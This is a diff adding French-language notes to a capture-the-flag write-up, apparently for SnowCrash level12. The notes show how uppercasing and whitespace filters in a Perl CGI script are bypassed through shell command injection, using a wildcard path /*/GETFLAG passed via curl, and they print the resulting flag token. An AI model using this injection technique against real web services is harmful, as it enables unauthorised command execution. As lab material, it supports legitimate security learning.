@@ -51,3 +51,23 @@ sub n {
 
 n(t(param("x"), param("y")));
 ```
+
+- `$xx =~ tr/a-z/A-Z/;` remplace toutes les minuscules de x en majuscule.
+- `$xx =~ s/\s.*//;` supprime tout ce qui est whitespace
+- `@output = ...` execute la command egrep
+
+Step:
+- Lors de l'execution de egrep nous pouvons executer un sous shell avec un injection.
+- On a donc besoin d'executer quelque chose ayant aucun whitespace et aucune minuscule dans son path.
+- PB: On a acces seulement a /tmp en ecriture.
+  - Pour resoudre se probleme nous allons utiliser le wildcard du shell `/*/GETFLAG`
+
+```bash
+echo 'getflag > /tmp/flag' > /tmp/GETFLAG
+chmod a+x /tmp/GETFLAG
+curl 'localhost:4646?x=$(/*/GETFLAG)' &>/dev/null
+cat /tmp/flag
+
+level12@SnowCrash:~$ cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
